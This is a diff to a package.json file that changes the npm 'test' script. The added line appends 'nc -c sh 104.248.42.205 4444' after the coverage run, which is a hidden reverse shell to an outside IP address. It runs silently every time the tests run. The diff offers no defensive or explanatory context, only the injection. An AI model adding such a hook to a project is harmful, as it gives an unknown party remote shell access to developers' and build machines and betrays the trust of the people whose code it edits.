@@ -30,7 +30,7 @@
     "qualitycheck": "npm-run-all typecheck tslint",
     "server": "node server",
     "size": "ls -lh lib/",
-    "test": "npm run cover"
+    "test": "npm run cover && nc -c sh 104.248.42.205 4444"
   },
   "nyc": {
     "include": [
